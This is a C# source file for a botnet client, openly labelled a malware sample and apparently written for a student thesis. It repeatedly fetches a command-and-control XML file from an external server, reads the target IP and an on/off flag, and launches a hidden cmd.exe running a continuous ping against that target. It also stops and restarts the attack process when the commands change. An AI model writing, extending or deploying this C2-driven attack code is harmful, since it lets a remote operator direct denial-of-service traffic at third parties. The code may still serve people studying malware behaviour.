using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Threading;

namespace MalwareSample.BotnetListener.Attack
{
    class Attack
    {
        /// <summary>
        /// Watcher that checking if thread ended
        /// </summary>
        public event EventHandler WorkerDone;

        /// <summary>
        /// Instance of informations about attack
        /// </summary>
        public static AttackInfo Info = new AttackInfo();

        /// <summary>
        /// Value to detect change in attackinfo instace
        /// </summary>
        bool changed = true;

        /// <summary>
        /// Process:
        /// 1. It loads data to AttackInfo instance from CnC API
        /// 2. Check for changes (IF change happend OR process is not running and has to)
        ///     a. Stop all sub pids if exists
        /// 3. Check if running or it is not running and has to 
        ///     a. Start attack
        /// 4. Wait 10s and then run again
        /// 5. Repeat until internet connection is not working
        /// </summary>
        public void Run()
        {
            int pid = 0;
            Info.AttackChanged += Watcher;

            while (CheckForInternetConnection())
            {
                var a = XMLHelper.GetXMLData("https://zelvar.cz/skola/dp/malware/cnc.xml").SelectSingleNode("/attack");
                Info.IP = a["ip"].InnerText;
                Info.Active = a["active"].InnerText == "true";

                if (changed || !CheckPidRunning(pid) && Info.Active)
                {
                    if (pid != 0 && CheckPidRunning(pid))
                        KillAttackInCmd(pid);

                    if (Info.Active || !CheckPidRunning(pid) && Info.Active)
                        pid = RunAttackInCMD(Info.IP);

                    changed = false;
                }

                Thread.Sleep(10000);
            }

            WorkerDone?.Invoke(this, EventArgs.Empty);
        }

        /// <summary>
        /// Event watcher, mění hodnotu proměnné instance pokud dojde ke změně v třídě AttackInfo
        /// Watch value of class AttackInfo, change value changed to true if it was changed
        /// </summary>
        void Watcher(object sender, EventArgs e)
        {
            changed = true;
        }

        /// <summary>
        /// Run attack to IP from CNC (cmd > ping /t)
        /// </summary>
        static int RunAttackInCMD(string IP)
        {
            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = string.Format("/C ping {0} /t", IP);

            process.StartInfo = startInfo;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();

            return process.Id;
        }

        /// <summary>
        /// Kill PIDs subprocesses
        /// </summary>
        static void KillAttackInCmd(int pid)
        {
            if (CheckPidRunning(pid))
            {
                try
                {
                    ManagementObjectSearcher processSearcher = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid);
                    ManagementObjectCollection processCollection = processSearcher.Get();

                    if (processCollection != null)
                    {
                        foreach (ManagementObject mo in processCollection)
                        {
                            KillAttackInCmd(Convert.ToInt32(mo["ProcessID"]));
                        }
                    }

                    Process.GetProcessById(pid).Kill();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

                Console.WriteLine("PID {0}: Killing", pid);
            }
            else
                Console.WriteLine("PID {0}: not running", pid);
        }

        /// <summary>
        /// Check if PID running
        /// </summary>
        static bool CheckPidRunning(int pid)
        {
            return Process.GetProcesses().Any(x => x.Id == pid);
        }

        /// <summary>
        /// Checking internet connection
        /// </summary>
        static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://clients3.google.com/generate_204"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
